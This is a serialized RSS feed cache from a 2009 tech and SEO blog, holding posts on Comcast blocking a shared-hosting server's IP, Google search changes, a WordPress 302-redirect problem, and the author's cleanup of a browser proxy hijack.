+I was working from home, and checking [...]";s:12:"atom_content";s:5273:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Ftechnology-articles%2Fcomcast-blocking-web-servers%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Ftechnology-articles%2Fcomcast-blocking-web-servers%2F" height="61" width="51" /></a></div><p>Yesterday afternoon PDXTC had a report that a website we were hosting was down, but the server administrators said that it was up.</p>
+<p>An hour later, we had a second report of another website down, and the admins claimed it was up as well, and that&#8217;s where I got involved.</p>
+<p>I was working from home, and checking both websites came up blank &#8211; page not found &#8211; through my Comcast internet connection.</p>
+<p>I looked up the users  FTP information, and I was unable to login top either account using FTP either, simply getting an &#8220;unable to connect&#8221; message.</p>
+<p>One common connection between the two domains was that they happened to be on the same server, but other than that there was no reason why I shouldn&#8217;t be able to see these domains.</p>
+<p>I went to a <a href="http://www.Hidemyass.com" target="_blank">free proxy service</a> and from there I was able to see both domains and verify that they were indeed up and running, so clearly this was a Comcast issue.</p>
+<p>Was Comcast actually blocking my access to the web server? Had someone on this shared hosting server done something nefarious, and now Comcast was preventing me from accessing it through their servers?</p>
+<p>I phoned Comcast, and of course had to sift through their ridiculous voicemail system, finally arriving at the tier 1 tech support where I had to fight my way past his insistence upon rebooting my router and checking my computer settings.</p>
+<p>Finally after getting the guy to understand that the problem belonged to Comcast,  he transferred me to the &#8220;abuse&#8221; section, where he claimed they must be &#8220;blocking those websites&#8221;.</p>
+<p>Blocking those websites?!? &#8211; I&#8217;d never heard of that before!</p>
+<p>I waited my turn in the queue with Abuse department, and when the guy answered, he listened patiently, verified what I said was true,  and then had me run a trace route and email him the results.</p>
+<p>As you can see, I didn&#8217;t get very far -</p>
+<p style="text-align: center;"><a href="http://www.pdxtc.com/wpblog/wp-content/uploads/tracert.jpg" target="_blank"><img class="size-medium wp-image-1566  aligncenter" title="tracert" src="http://www.pdxtc.com/wpblog/wp-content/uploads/tracert-300x245.jpg" alt="" /></a></p>
+<p>By that point it was after seven o&#8217;clock at night, and he told me he would have to escalate it to his next support level but that I shouldn&#8217;t expect it to be &#8220;fixed&#8221;until some time the next day.</p>
+<p>At this point I asked if Comcast could be intentionally blocking my server IP address, and he assured me that no,   Comcast does not block access to web servers in the same way that they <a href="http://www.pdxtc.com/wpblog/technology-articles/cant-send-mail-using-comcast/" target="_self">block mail servers and ports</a>.</p>
+<p>Under certain circumstances he says, where a website is known to be distributing Malware or viruses, they may issue a warning before the users arrival that &#8220;the site may be harmful&#8230;&#8221; , but they do not,<strong> as far as he knows,</strong> intentionally block access to a Web server.  As far as he knows&#8230; Huh.</p>
+<p>Well, this morning, the sites are back up and I may never know what went wrong, so I guess I&#8217;ll just move on.</p>
+<p><strong>*** Update ***</strong></p>
+<p>I got a phone call back from comcast to tell me that all was resolved, and as it turns out,  <strong>Comcast HAD intentionally blocked all activity from that web server IP address</strong>!</p>
+<p>Interestingly, sites hosted on that same web server that had been assigned a static IP address continud to work fine, but the shared hosting domains were all blocked, with no warning message to the user, and FTP, Trace Route, and even pings to the IP were blocked entirely.</p>
+<p>The Comcast rep read me the notes he had gotten from engineering, and they sais that the IP was blocked because &#8220;Malicious data flows were detected over TCP port 80&#8243;.</p>
+<p>That&#8217;s it &#8211; no indication of what domain caused it, nor, was there any reason given WHY they would UNblock it at my request, since presumably the malicious activity is still going on from whatever domain was causing the problem. Bizarre.</p>
+<p>This was news to me, and news to the guy in security, who said he&#8217;s never heard of them blocking IP addresses like this before.</p>
+<p>So, is the moral of the story that a shared hosting account may be risky to your visibility? It looks that way, doesn&#8217;t it?</p>
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+";s:14:"date_timestamp";i:1261543760;}i:7;a:14:{s:5:"title";s:34:"Google Game Changers | December 09";s:4:"link";s:68:"http://www.pdxtc.com/wpblog/google/google-game-changers-december-09/";s:8:"comments";s:77:"http://www.pdxtc.com/wpblog/google/google-game-changers-december-09/#comments";s:7:"pubdate";s:31:"Mon, 21 Dec 2009 11:34:08 +0000";s:2:"dc";a:1:{s:7:"creator";s:5:"Scott";}s:8:"category";s:19:"GoogleIndustry News";s:4:"guid";s:35:"http://www.pdxtc.com/wpblog/?p=1537";s:11:"description";s:320:"There were a few changes at Google this month which I&#8217;ve been pointing out to clients, so I&#8217;m posting them here too.
+I added the month to my title, because I expect we&#8217;ll be seeing a lot more of these types of game changers as time goes on.
+You &#38; I See Different Search Results
+On December 4, [...]";s:7:"content";a:1:{s:7:"encoded";s:8040:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fgoogle%2Fgoogle-game-changers-december-09%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fgoogle%2Fgoogle-game-changers-december-09%2F" height="61" width="51" /></a></div><p>There were a few changes at Google this month which I&#8217;ve been pointing out to clients, so I&#8217;m posting them here too.</p>
+<p>I added the month to my title, because I expect we&#8217;ll be seeing a lot more of these types of game changers as time goes on.</p>
+<p><strong>You &amp; I See Different Search Results</strong><br />
+On December 4, while I was in Los Angeles at an <a href="http://www.affiliateconvention.com" target="_blank">Affiliate Convention</a> session, a rumble went through the crowd after someone shouted out &#8220;<a href="http://searchengineland.com/google-now-personalizes-everyones-search-results-31195" target="_blank">Hey, Google is showing personalized results</a> to everyone whether they&#8217;re signed in or not&#8221;!</p>
+<p>Now there are search industry pundits that think it&#8217;s a <a href="http://www.seomoz.org/blog/two-cents-on-personalized-search" target="_blank">good thing</a>, those that think it&#8217;s a <a href="http://www.pcworld.com/businesscenter/article/183891/google_personalized_results_could_be_bad_for_search.html" target="_blank">bad thing</a>, and those that think that it <a href="http://www.cemper.com/seo-knowhow/personalized-search-for-everyone-so-what" target="_blank">really doesn&#8217;t matter</a> but there&#8217;s no denying that it changes the game.</p>
+<p>All end users will now see more varied search results than someone else. Even though this has already been taking place for a while based on their IP location and Google data center differences, now, those differences will become even more substantial based on their browsing history.</p>
+<p>(Is it based on the whole IP address? Is it just per browser? Is there a machine or CPU ID? I don&#8217;t yet know &#8211; do you?)</p>
+<p><strong>Real Time Search</strong><br />
+The personalized results change was overshadowed in the media by some big announcements on December 7th, primarily about their <a href="http://googleblog.blogspot.com/2009/12/relevance-meets-real-time-web.html" target="_blank">new real time search</a>.</p>
+<p>It&#8217;s hard to replicate on demand, because it only shows up for highly active topics, like a search fopr &#8220;Obama Speech&#8221; in the couple of days following one, or search for a news event as one is happening,  like &#8220;winter solstice 2009&#8243;  you&#8217;ll see an actual moving/scrolling section of the latest news and Twitter Tweets in what&#8217;s practically real time.</p>
+<p><img class="aligncenter size-full wp-image-1555" title="twitter-in-google" src="http://www.pdxtc.com/wpblog/wp-content/uploads/twitter-in-google.jpg" alt="twitter-in-google" width="480" height="317" /></p>
+<p>Do you think this will add to the current noise level in social media and news?  I sure do, and I call it a &#8220;game changer&#8221; because of all the auto posting that will now undoubtedly be put on steroids, in anticipation of this expanding further.</p>
+<p><strong>Google Goggles</strong><br />
+Take a photo with your cell phone, and Google will tell you what it is.  Cool for the Eiffel Tower, but is seems to have pretty creepy potential issues for that woman sitting alone in a bar, isn&#8217;t it?  Check out their short video&#8230;</p>
+<div style="text-align: center;"><object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="480" height="295" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0"><param name="allowFullScreen" value="true" /><param name="allowscriptaccess" value="always" /><param name="src" value="http://www.youtube.com/v/Hhgfz0zPmH4&amp;hl=en_US&amp;fs=1&amp;rel=0&amp;color1=0x3a3a3a&amp;color2=0x999999" /><param name="allowfullscreen" value="true" /><embed type="application/x-shockwave-flash" width="480" height="295" src="http://www.youtube.com/v/Hhgfz0zPmH4&amp;hl=en_US&amp;fs=1&amp;rel=0&amp;color1=0x3a3a3a&amp;color2=0x999999" allowscriptaccess="always" allowfullscreen="true"></embed></object></div>
+<p>Wherever you fall on the potential privacy issues,  I do think that the technology is going to be a game changer as it continues to evolve.</p>
+<p><strong>Keeping You on Google Properties</strong><br />
+Google is delivering more and more information to users without then needing to leave the results page. Lokk at a search for your favorite football team as an example, where you can see the score, their leading rusher, and the date and opponent for their next game without clicking through.</p>
+<p><img class="aligncenter size-full wp-image-1547" title="jets" src="http://www.pdxtc.com/wpblog/wp-content/uploads/jets.jpg" alt="jets" width="480" height="310" /></p>
+<p>(Do you think this is a fair representation of what <a href="http://www.inquisitr.com/21237/murdoch-targets-google-over-google-news-lawsuit-to-follow/" target="_blank">Rupert Murdoch is concerned with</a>? You can see the image from the NY Times, and the info coming from the Atlanta Journal Constitution)</p>
+<p><span style="color: #ff0000;"><strong>*** Update &#8211; 4pm ****</strong></span></p>
+<p>Oops &#8211; Looks like this last item below was just  more browser monkey business &#8211; AdWare &#8211; called &#8220;Browser Highlighter&#8221;, on my computer.   I guess I jumped to conclusions,  but with so many other Google changes this month, it really didn&#8217;t surprise me all that much!</p>
+<p><span style="text-decoration: line-through;"><strong>Selling the Front Page</strong><br />
+Just this minute, I&#8217;m seeing color Ebay ads on the front page, while I&#8217;m not even signed in to Google.</span></p>
+<p><img class="aligncenter size-full wp-image-1542" title="ebayad" src="http://www.pdxtc.com/wpblog/wp-content/uploads/ebayad.jpg" alt="ebayad" width="500" height="251" /></p>
+<p><span style="text-decoration: line-through;">Is it a sponsored ad? No&#8230;  Is it a pay for placement? Pay for inclusion? Is is Pay Per Action, where Google gets a piece if a sale is made?  Who knows?</span></p>
+<p><span style="text-decoration: line-through;">So, in addition to PPC ads, we&#8217;re now going to see this sort of paid result, further moving the organic SERPS lower on the priority list and in some cases, well below the fold.</span></p>
+<p><span style="text-decoration: line-through;">Where&#8217;s Amazon, and can they bid against Ebay?  I wonder how long it will be before there are other brand banners, perhaps even larger? Will they be doing the same thing inside <a href="http://www.pdxtc.com/wpblog/google/googles-new-option-wonder-wheel-video/" target="_blank">Google&#8217;s Wonder wheel?</a></span></p>
+<p><span style="text-decoration: line-through;">I guess we&#8217;ll be finding out soon, as Google continues to change the game for everyone, consumers and marketers alike&#8230;.</span></p>
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+";}s:3:"wfw";a:1:{s:10:"commentrss";s:73:"http://www.pdxtc.com/wpblog/google/google-game-changers-december-09/feed/";}s:5:"slash";a:1:{s:8:"comments";s:1:"6";}s:7:"summary";s:320:"There were a few changes at Google this month which I&#8217;ve been pointing out to clients, so I&#8217;m posting them here too.
+I added the month to my title, because I expect we&#8217;ll be seeing a lot more of these types of game changers as time goes on.
+You &#38; I See Different Search Results
+On December 4, [...]";s:12:"atom_content";s:8040:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fgoogle%2Fgoogle-game-changers-december-09%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fgoogle%2Fgoogle-game-changers-december-09%2F" height="61" width="51" /></a></div><p>There were a few changes at Google this month which I&#8217;ve been pointing out to clients, so I&#8217;m posting them here too.</p>
+<p>I added the month to my title, because I expect we&#8217;ll be seeing a lot more of these types of game changers as time goes on.</p>
+<p><strong>You &amp; I See Different Search Results</strong><br />
+On December 4, while I was in Los Angeles at an <a href="http://www.affiliateconvention.com" target="_blank">Affiliate Convention</a> session, a rumble went through the crowd after someone shouted out &#8220;<a href="http://searchengineland.com/google-now-personalizes-everyones-search-results-31195" target="_blank">Hey, Google is showing personalized results</a> to everyone whether they&#8217;re signed in or not&#8221;!</p>
+<p>Now there are search industry pundits that think it&#8217;s a <a href="http://www.seomoz.org/blog/two-cents-on-personalized-search" target="_blank">good thing</a>, those that think it&#8217;s a <a href="http://www.pcworld.com/businesscenter/article/183891/google_personalized_results_could_be_bad_for_search.html" target="_blank">bad thing</a>, and those that think that it <a href="http://www.cemper.com/seo-knowhow/personalized-search-for-everyone-so-what" target="_blank">really doesn&#8217;t matter</a> but there&#8217;s no denying that it changes the game.</p>
+<p>All end users will now see more varied search results than someone else. Even though this has already been taking place for a while based on their IP location and Google data center differences, now, those differences will become even more substantial based on their browsing history.</p>
+<p>(Is it based on the whole IP address? Is it just per browser? Is there a machine or CPU ID? I don&#8217;t yet know &#8211; do you?)</p>
+<p><strong>Real Time Search</strong><br />
+The personalized results change was overshadowed in the media by some big announcements on December 7th, primarily about their <a href="http://googleblog.blogspot.com/2009/12/relevance-meets-real-time-web.html" target="_blank">new real time search</a>.</p>
+<p>It&#8217;s hard to replicate on demand, because it only shows up for highly active topics, like a search fopr &#8220;Obama Speech&#8221; in the couple of days following one, or search for a news event as one is happening,  like &#8220;winter solstice 2009&#8243;  you&#8217;ll see an actual moving/scrolling section of the latest news and Twitter Tweets in what&#8217;s practically real time.</p>
+<p><img class="aligncenter size-full wp-image-1555" title="twitter-in-google" src="http://www.pdxtc.com/wpblog/wp-content/uploads/twitter-in-google.jpg" alt="twitter-in-google" width="480" height="317" /></p>
+<p>Do you think this will add to the current noise level in social media and news?  I sure do, and I call it a &#8220;game changer&#8221; because of all the auto posting that will now undoubtedly be put on steroids, in anticipation of this expanding further.</p>
+<p><strong>Google Goggles</strong><br />
+Take a photo with your cell phone, and Google will tell you what it is.  Cool for the Eiffel Tower, but is seems to have pretty creepy potential issues for that woman sitting alone in a bar, isn&#8217;t it?  Check out their short video&#8230;</p>
+<div style="text-align: center;"><object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="480" height="295" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0"><param name="allowFullScreen" value="true" /><param name="allowscriptaccess" value="always" /><param name="src" value="http://www.youtube.com/v/Hhgfz0zPmH4&amp;hl=en_US&amp;fs=1&amp;rel=0&amp;color1=0x3a3a3a&amp;color2=0x999999" /><param name="allowfullscreen" value="true" /><embed type="application/x-shockwave-flash" width="480" height="295" src="http://www.youtube.com/v/Hhgfz0zPmH4&amp;hl=en_US&amp;fs=1&amp;rel=0&amp;color1=0x3a3a3a&amp;color2=0x999999" allowscriptaccess="always" allowfullscreen="true"></embed></object></div>
+<p>Wherever you fall on the potential privacy issues,  I do think that the technology is going to be a game changer as it continues to evolve.</p>
+<p><strong>Keeping You on Google Properties</strong><br />
+Google is delivering more and more information to users without then needing to leave the results page. Lokk at a search for your favorite football team as an example, where you can see the score, their leading rusher, and the date and opponent for their next game without clicking through.</p>
+<p><img class="aligncenter size-full wp-image-1547" title="jets" src="http://www.pdxtc.com/wpblog/wp-content/uploads/jets.jpg" alt="jets" width="480" height="310" /></p>
+<p>(Do you think this is a fair representation of what <a href="http://www.inquisitr.com/21237/murdoch-targets-google-over-google-news-lawsuit-to-follow/" target="_blank">Rupert Murdoch is concerned with</a>? You can see the image from the NY Times, and the info coming from the Atlanta Journal Constitution)</p>
+<p><span style="color: #ff0000;"><strong>*** Update &#8211; 4pm ****</strong></span></p>
+<p>Oops &#8211; Looks like this last item below was just  more browser monkey business &#8211; AdWare &#8211; called &#8220;Browser Highlighter&#8221;, on my computer.   I guess I jumped to conclusions,  but with so many other Google changes this month, it really didn&#8217;t surprise me all that much!</p>
+<p><span style="text-decoration: line-through;"><strong>Selling the Front Page</strong><br />
+Just this minute, I&#8217;m seeing color Ebay ads on the front page, while I&#8217;m not even signed in to Google.</span></p>
+<p><img class="aligncenter size-full wp-image-1542" title="ebayad" src="http://www.pdxtc.com/wpblog/wp-content/uploads/ebayad.jpg" alt="ebayad" width="500" height="251" /></p>
+<p><span style="text-decoration: line-through;">Is it a sponsored ad? No&#8230;  Is it a pay for placement? Pay for inclusion? Is is Pay Per Action, where Google gets a piece if a sale is made?  Who knows?</span></p>
+<p><span style="text-decoration: line-through;">So, in addition to PPC ads, we&#8217;re now going to see this sort of paid result, further moving the organic SERPS lower on the priority list and in some cases, well below the fold.</span></p>
+<p><span style="text-decoration: line-through;">Where&#8217;s Amazon, and can they bid against Ebay?  I wonder how long it will be before there are other brand banners, perhaps even larger? Will they be doing the same thing inside <a href="http://www.pdxtc.com/wpblog/google/googles-new-option-wonder-wheel-video/" target="_blank">Google&#8217;s Wonder wheel?</a></span></p>
+<p><span style="text-decoration: line-through;">I guess we&#8217;ll be finding out soon, as Google continues to change the game for everyone, consumers and marketers alike&#8230;.</span></p>
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+";s:14:"date_timestamp";i:1261395248;}i:8;a:14:{s:5:"title";s:29:"WordPress Forces 302 Redirect";s:4:"link";s:62:"http://www.pdxtc.com/wpblog/seo/wordpress-forces-302-redirect/";s:8:"comments";s:71:"http://www.pdxtc.com/wpblog/seo/wordpress-forces-302-redirect/#comments";s:7:"pubdate";s:31:"Wed, 09 Dec 2009 21:14:11 +0000";s:2:"dc";a:1:{s:7:"creator";s:5:"Scott";}s:8:"category";s:12:"SEOWordpress";s:4:"guid";s:35:"http://www.pdxtc.com/wpblog/?p=1527";s:11:"description";s:329:"I love WordPress, I really do, but i just screwed up a site by changing a bunch of permalinks to 302&#8217;s.
+Worse, WP won&#8217;t allow me to change it back without digging into the database, so I effectively rendered my child page permalinks (URLs) useless.
+In this short video I&#8217;ll show you exactly what not to do [...]";s:7:"content";a:1:{s:7:"encoded";s:2269:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fseo%2Fwordpress-forces-302-redirect%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fseo%2Fwordpress-forces-302-redirect%2F" height="61" width="51" /></a></div><p>I love WordPress, I really do, but i just screwed up a site by changing a bunch of permalinks to 302&#8217;s.</p>
+<p>Worse, WP won&#8217;t allow me to change it back without digging into the database, so I effectively rendered my child page permalinks (URLs) useless.</p>
+<p>In this short video I&#8217;ll show you exactly what not to do -( besides assume that WordPress will work the way it&#8217;s supposed to).</p>
+<p>I&#8217;ve written about <a href="http://www.pdxtc.com/wpblog/search-engines/wp-2-82-may-harm-rankings/" target="_blank">WP hurting search rankings</a> before,  and while changing the LAST part of a permalink does now seem to 301 correctly,  in this case, changing the permalink of a parent page causes a 302  temporary redirect of all the child pages.</p>
+<p>This, of course, kills your PageRank and effectively removes any inbound link equity that those pages may have obtained.  Nice, huh?</p>
+<p>*Update 12/15 &#8211; We are now <a href="http://scott.yang.id.au/code/permalink-redirect/" target="_blank" >using this redirection plugin</a> on all new or upgraded WP installations until they fix it&#8230; </p>
+<p style="text-align: center;"><object type="application/x-shockwave-flash" data="http://www.pdxtc.com/wpblog/wp-content/plugins/pb-embedflash/swf/mediaplayer.swf?width=425&amp;height=375" width="425" height="375" class="embedflash"><param name="movie" value="http://www.pdxtc.com/wpblog/wp-content/plugins/pb-embedflash/swf/mediaplayer.swf?width=425&amp;height=375" /><param name="allowfullscreen" value="true" /><param name="allowscriptaccess" value="always" /><param name="flashvars" value="searchbar=false&amp;showstop=true&amp;showdownload=true&amp;usefullscreen=false&amp;file=http://www.pdxtc.com/vids/wp-302-still/wp-302-still.flv" /><small>(Please open the article to see the flash file or player.)</small></object></p>
+";}s:3:"wfw";a:1:{s:10:"commentrss";s:67:"http://www.pdxtc.com/wpblog/seo/wordpress-forces-302-redirect/feed/";}s:5:"slash";a:1:{s:8:"comments";s:1:"1";}s:7:"summary";s:329:"I love WordPress, I really do, but i just screwed up a site by changing a bunch of permalinks to 302&#8217;s.
+Worse, WP won&#8217;t allow me to change it back without digging into the database, so I effectively rendered my child page permalinks (URLs) useless.
+In this short video I&#8217;ll show you exactly what not to do [...]";s:12:"atom_content";s:2269:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fseo%2Fwordpress-forces-302-redirect%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fseo%2Fwordpress-forces-302-redirect%2F" height="61" width="51" /></a></div><p>I love WordPress, I really do, but i just screwed up a site by changing a bunch of permalinks to 302&#8217;s.</p>
+<p>Worse, WP won&#8217;t allow me to change it back without digging into the database, so I effectively rendered my child page permalinks (URLs) useless.</p>
+<p>In this short video I&#8217;ll show you exactly what not to do -( besides assume that WordPress will work the way it&#8217;s supposed to).</p>
+<p>I&#8217;ve written about <a href="http://www.pdxtc.com/wpblog/search-engines/wp-2-82-may-harm-rankings/" target="_blank">WP hurting search rankings</a> before,  and while changing the LAST part of a permalink does now seem to 301 correctly,  in this case, changing the permalink of a parent page causes a 302  temporary redirect of all the child pages.</p>
+<p>This, of course, kills your PageRank and effectively removes any inbound link equity that those pages may have obtained.  Nice, huh?</p>
+<p>*Update 12/15 &#8211; We are now <a href="http://scott.yang.id.au/code/permalink-redirect/" target="_blank" >using this redirection plugin</a> on all new or upgraded WP installations until they fix it&#8230; </p>
+<p style="text-align: center;"><object type="application/x-shockwave-flash" data="http://www.pdxtc.com/wpblog/wp-content/plugins/pb-embedflash/swf/mediaplayer.swf?width=425&amp;height=375" width="425" height="375" class="embedflash"><param name="movie" value="http://www.pdxtc.com/wpblog/wp-content/plugins/pb-embedflash/swf/mediaplayer.swf?width=425&amp;height=375" /><param name="allowfullscreen" value="true" /><param name="allowscriptaccess" value="always" /><param name="flashvars" value="searchbar=false&amp;showstop=true&amp;showdownload=true&amp;usefullscreen=false&amp;file=http://www.pdxtc.com/vids/wp-302-still/wp-302-still.flv" /><small>(Please open the article to see the flash file or player.)</small></object></p>
+";s:14:"date_timestamp";i:1260393251;}i:9;a:14:{s:5:"title";s:32:"Google Search Results Redirected";s:4:"link";s:79:"http://www.pdxtc.com/wpblog/viruses-and-scams/google-search-results-redirected/";s:8:"comments";s:88:"http://www.pdxtc.com/wpblog/viruses-and-scams/google-search-results-redirected/#comments";s:7:"pubdate";s:31:"Wed, 02 Dec 2009 23:37:20 +0000";s:2:"dc";a:1:{s:7:"creator";s:5:"Scott";}s:8:"category";s:17:"Viruses and Scams";s:4:"guid";s:35:"http://www.pdxtc.com/wpblog/?p=1511";s:11:"description";s:324:"I was 45 minutes from leaving for the airport, moving stuff to my laptop, and tying up loose ends before traveling to Affiliate Convention. The last thing I needed was a computer problem.
+Update 12/8 &#8211; I just got back, and it&#8217;s not fixed! Please see the bottom of this post where I&#8217;ll continue to add [...]";s:7:"content";a:1:{s:7:"encoded";s:7398:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fviruses-and-scams%2Fgoogle-search-results-redirected%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fviruses-and-scams%2Fgoogle-search-results-redirected%2F" height="61" width="51" /></a></div><p>I was 45 minutes from leaving for the airport, moving stuff to my laptop, and tying up loose ends before traveling to Affiliate Convention. The last thing I needed was a computer problem.</p>
+<p><span style="color: #000000;"><span style="text-decoration: line-through;"><em>Update 12/8 &#8211; I just got back, and it&#8217;s not fixed! Please see the bottom of this post where I&#8217;ll continue to add notes about resolution, or so see if  I give up <img src='http://www.pdxtc.com/wpblog/wp-includes/images/smilies/icon_wink.gif' alt=';)' class='wp-smiley' /> </em></span></span></p>
+<p><em><span style="color: #ff0000;">Update 12/8 &#8211; all fixed (apparently)</span></em><span style="text-decoration: line-through;"><em><span style="color: #ff0000;"><br />
+</span></em></span></p>
+<p>I did a Google site: search for an item at SearchEnginewatch.com to send to a client, but when I clicked the result, instead of the article, I ended up at a different site entirely. Huh?</p>
+<p>I hit the &#8220;back&#8221; button, tried the same SERP listing, and got a different page, almost as if it was randomized. Then I did a Google search for &#8220;dog food&#8221;, and from the the listings, 8 out of 10 results took me somewhere other than my intended destination. Something was REALLY wrong.</p>
+<p>That&#8217;s when it dawned on me that about 10 minutes earlier, I had a 20 &#8211; 30 second lockup while visiting some other website (No, I don&#8217;t know which), and my <a href="http://www.pdxtc.com/wpblog/computers-how-to/how-i-control-my-windows-performance/" target="_blank">Winpatrol</a> warning went off, asking me, &#8220;Do you want to add this item to your Windows Startup?&#8221; Although I said &#8220;No&#8221; apparently something slipped by, and my Firefox was screwed.</p>
+<p>Running out of time before leaving, I opened Internet Explorer, assuming it would be fine. Did a site: search at Google, and my SERPS had been hijacked in IE too.</p>
+<p>I began running Malware Bytes, a process that would take a couple of hours, and used my laptop to <a href="http://twitter.com/shendison/status/6270394461" target="_blank">Tweet out a message</a>, where @DavidKyle replied with a link to &#8220;Hijack This&#8221; which allows you to see registry additions.</p>
+<p>After spending 10 minutes in Hijack This checking boxes for things I KNEW things were fine, I added them to the &#8220;ignore&#8221; list, and was left with a couple dozen items to examine, but this was right at the top -</p>
+<p style="text-align: center;"><img class="aligncenter size-full wp-image-1510" title="hijack-large" src="http://www.pdxtc.com/wpblog/wp-content/uploads/hijack-large.jpg" alt="hijack-large" width="523" height="112" /></p>
+<p style="text-align: center;">
+<p style="text-align: left;">I browsed to my registry path, and yep, there it was, an IP address entered for proxy use.</p>
+<p>In case you don&#8217;t know, a proxy allows you to surf the web by going through their IP address. Reasons for CHOOSING to use a proxy vary, but in this case, it looked like the owner of the proxy IP was forcing me to go elsewhere, to other websites.</p>
+<p>I looked up thje owner of the IP address at Domain Tools, and it turned out to be owned by the University of Washington. Great &#8211; some bored kid, using the schoos resouirces to deliver who knows what sort of crap to my PC.</p>
+<p>I decided to let Malware Bytes continue to run rather than make any attempt at fixing it, and I left for the airport, dwelling on it all the way there.</p>
+<p>As soon as I made it past security, I logged in remotely to see if the Malware Byte scan had finished, and it hadn&#8217;t. Not only that, but it hadn&#8217;t found anything out of the norm, either.</p>
+<p>So, rather than use HiJack This to &#8220;fix&#8221; the problem by removing the registry entry, I decided to open Internet Explorer and went to the Proxy settings, where I saw the offending entry.</p>
+<p style="text-align: left;">
+<p style="text-align: left;"><img class="aligncenter size-full wp-image-1514" title="hijack-IE-proxy2" src="http://www.pdxtc.com/wpblog/wp-content/uploads/hijack-IE-proxy2.jpg" alt="hijack-IE-proxy2" width="382" height="336" /></p>
+<p style="text-align: left;">
+<p style="text-align: left;">The box was NOT checked to use a Proxy, however, I could see the offending IP in the grayed out section.</p>
+<p>All I had to do was check the box, delete the IP and port entries, hit OK, and then UNcheck the box again. I did a quick search at Google, and the problem was gone &#8211; Nice.</p>
+<p>I can&#8217;t say for sure that this fixed everything, and I&#8217;ll likely have to get into Firefox and do the same thing, but I&#8217;ll bet dollars to donuts that&#8217;s it.</p>
+<p>I was running IE8 and FF3, both patched with the absolute latest security fixes.  I have a firewall, AntiVirus, and a startup protector that SHOULD have prevented this problem. Apparently, we&#8217;re not as safe as we like to think.</p>
+<p>I&#8217;m writing this on the plane, but I&#8217;ll post it with screen shots when I get in later today &#8211; (right after I see if proxyaffiliatemarketing.com is available for registration <img src='http://www.pdxtc.com/wpblog/wp-includes/images/smilies/icon_wink.gif' alt=';)' class='wp-smiley' /> </p>
+<p><strong>*Update &#8211; 12/07 8am </strong><br />
